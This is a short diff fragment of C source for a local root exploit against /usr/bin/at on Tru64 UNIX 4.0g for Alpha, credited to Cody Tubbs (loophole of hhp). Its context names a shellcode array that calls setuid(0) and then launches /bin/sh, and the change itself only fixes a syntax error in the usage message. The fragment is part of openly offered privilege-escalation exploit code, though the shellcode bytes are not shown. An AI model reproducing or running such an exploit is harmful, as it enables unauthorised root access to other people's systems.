@@ -35,7 +35,7 @@ char shellcode[]= // Alpha setuid(0);+ execl("/bin/sh","sh",0);
 
 void usage(char *arg) {
   fprintf(stderr, "\nTru64 UNIX 4.0g (JAVA) (/usr/bin/at)");
-  fprintf(stderr, " local root exploit. [ALPHA] \n";
+  fprintf(stderr, " local root exploit. [ALPHA] \n");
   fprintf(stderr, "Author: Cody Tubbs (loophole of hhp)\n\n");
   fprintf(stderr, "Usage: %s <offset> [allign(0..3)]\n", arg);
   fprintf(stderr, "Examp: %s 0\n", arg);
